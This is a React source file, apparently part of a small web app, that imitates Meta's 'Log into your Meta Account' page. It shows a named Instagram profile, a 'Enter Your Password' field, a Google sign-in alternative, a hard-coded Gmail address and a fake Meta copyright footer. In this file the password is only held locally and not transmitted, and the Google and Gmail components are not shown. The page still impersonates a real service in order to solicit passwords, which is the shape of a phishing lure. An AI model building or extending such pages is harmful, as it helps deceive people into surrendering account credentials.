/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { Instagram, ExternalLink } from 'lucide-react';
import { AccountCard } from './components/AccountCard';
import { GoogleSignInPage } from './components/GoogleSignInPage';
import { GmailRedirectView } from './components/GmailRedirectView';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'meta' | 'google' | 'gmail'>('meta');
  // Starts completely un-prefilled without any @ or default value
  const [name, setName] = useState<string>('');
  const [nameError, setNameError] = useState<string>('');
  const [selectedLanguage, setSelectedLanguage] = useState<string>('English (US)');

  // Fixed destination URL (does not dynamically search or alter the link)
  const instagramUrl = 'https://www.instagram.com/______t_a_n_u/';

  const handleOpenInstagram = (e: React.MouseEvent) => {
    if (!name.trim()) {
      e.preventDefault();
      setNameError('Please enter your password');
      document.getElementById('name-input')?.focus();
      return;
    }
    setNameError('');
  };

  // Alternate Way: Google Sign-in View
  if (currentPage === 'google') {
    return (
      <GoogleSignInPage
        email="tanubannu27@gmail.com"
        onBackToMeta={() => {
          setCurrentPage('meta');
        }}
        onLoginSuccess={() => {
          setCurrentPage('gmail');
        }}
      />
    );
  }

  // Gmail Inbox Redirect View
  if (currentPage === 'gmail') {
    return (
      <GmailRedirectView
        email="tanubannu27@gmail.com"
        onBackToLogin={() => {
          setCurrentPage('meta');
        }}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[#18191a] text-[#e4e6eb] flex flex-col items-center justify-between font-sans selection:bg-[#0866ff]/30 selection:text-white relative overflow-x-hidden">
      
      {/* Main Content Area */}
      <main className="w-full flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8">
        
        {/* Main Card Container */}
        <div className="w-full max-w-[420px] rounded-[32px] bg-[#18191a] p-6 sm:p-7 relative my-auto">
          <div className="flex flex-col">
            
            {/* 1. Header */}
            <h1 className="text-[31px] font-bold text-white tracking-[-0.02em] leading-[1.18] mt-2 mb-3">
              Log into your Meta Account
            </h1>

            {/* 2. Subtitle */}
            <div className="text-[16px] text-[#b0b3b8] font-normal leading-[1.4] mb-6">
              <p>Log in to use your profiles, including</p>
              <p className="tracking-tight text-[#e4e6eb] font-medium">_______t_a_n_u.</p>
            </div>

            {/* 3. Account Card */}
            <div className="mb-6">
              <AccountCard
                username="_______t_a_n_u"
              />
            </div>

            {/* 4. Name Input & Action Buttons */}
            <div className="flex flex-col space-y-4">
              
              {/* Un-prefilled Name Input without @ */}
              <div className="relative">
                <div
                  className={`relative w-full h-[60px] rounded-[20px] bg-[#18191a] border transition-colors flex items-center px-5 ${
                    nameError
                      ? 'border-red-500'
                      : 'border-[#3e4042] focus-within:border-[#0866ff] focus-within:ring-1 focus-within:ring-[#0866ff]'
                  }`}
                >
                  <input
                    id="name-input"
                    type="text"
                    value={name}
                    onChange={(e) => {
                      setName(e.target.value);
                      if (nameError) setNameError('');
                    }}
                    placeholder="Enter Your Password"
                    autoComplete="off"
                    className="w-full h-full bg-transparent text-[16px] text-white placeholder-[#8a8d91] font-normal focus:outline-none tracking-normal"
                  />
                </div>
                {nameError && (
                  <p className="text-xs text-red-400 mt-1.5 px-2 animate-fade-in">
                    {nameError}
                  </p>
                )}
              </div>

              {/* Primary Direct Open Instagram Button (Requires name) */}
              {name.trim() ? (
                <a
                  href={instagramUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full h-[52px] rounded-full bg-[#0866ff] hover:bg-[#0055d4] active:bg-[#004dc0] text-white text-[16px] font-semibold tracking-normal transition-all duration-150 flex items-center justify-center gap-2.5 cursor-pointer shadow-md select-none"
                >
                  <Instagram className="w-5 h-5 text-white shrink-0" />
                  <span>Login</span>
                  <ExternalLink className="w-4 h-4 text-white/80 shrink-0 ml-0.5" />
                </a>
              ) : (
                <button
                  type="button"
                  onClick={handleOpenInstagram}
                  className="w-full h-[52px] rounded-full bg-[#0866ff]/60 text-white/80 text-[16px] font-semibold tracking-normal transition-all duration-150 flex items-center justify-center gap-2.5 cursor-pointer shadow-sm select-none"
                  title="Please enter your password first"
                >
                  <Instagram className="w-5 h-5 text-white/80 shrink-0" />
                  <span>Login</span>
                  <ExternalLink className="w-4 h-4 text-white/60 shrink-0 ml-0.5" />
                </button>
              )}

              {/* Secondary Button: Try another way */}
              <button
                type="button"
                onClick={() => setCurrentPage('google')}
                className="w-full h-[52px] rounded-full bg-[#303134] hover:bg-[#3a3b3c] active:bg-[#252627] text-[#e4e6eb] text-[16px] font-semibold tracking-normal transition-all duration-150 flex items-center justify-center cursor-pointer select-none"
              >
                <span>Try another way</span>
              </button>
            </div>

            {/* Static non-reactive text prompt */}
            <div className="mt-6 pt-4 text-center border-t border-white/[0.06]">
              <p className="text-xs text-[#8a8d91] select-none cursor-default">
                Not _______t_a_n_u? Switch profile
              </p>
            </div>

          </div>
        </div>
      </main>

      {/* Meta Footer */}
      <footer className="w-full py-6 px-4 text-center text-xs text-[#8a8d91] space-y-3 z-10 border-t border-white/[0.04]">
        {/* Languages */}
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1.5">
          {['English (US)', 'Español', 'Français (France)', 'Português (Brasil)', 'Deutsch', 'Italiano'].map((lang) => (
            <button
              key={lang}
              type="button"
              onClick={() => setSelectedLanguage(lang)}
              className={`hover:underline transition-colors ${
                selectedLanguage === lang ? 'text-white font-medium' : 'text-[#8a8d91]'
              }`}
            >
              {lang}
            </button>
          ))}
        </div>

        {/* Legal & Meta attribution */}
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-[11px]">
          <span>© 2026 Meta</span>
          <a href="#about" onClick={(e) => e.preventDefault()} className="hover:underline">About</a>
          <a href="#help" onClick={(e) => e.preventDefault()} className="hover:underline">Help</a>
          <a href="#privacy" onClick={(e) => e.preventDefault()} className="hover:underline">Privacy Policy</a>
          <a href="#terms" onClick={(e) => e.preventDefault()} className="hover:underline">Terms</a>
          <a href="#cookies" onClick={(e) => e.preventDefault()} className="hover:underline">Cookies</a>
        </div>
      </footer>

    </div>
  );
}
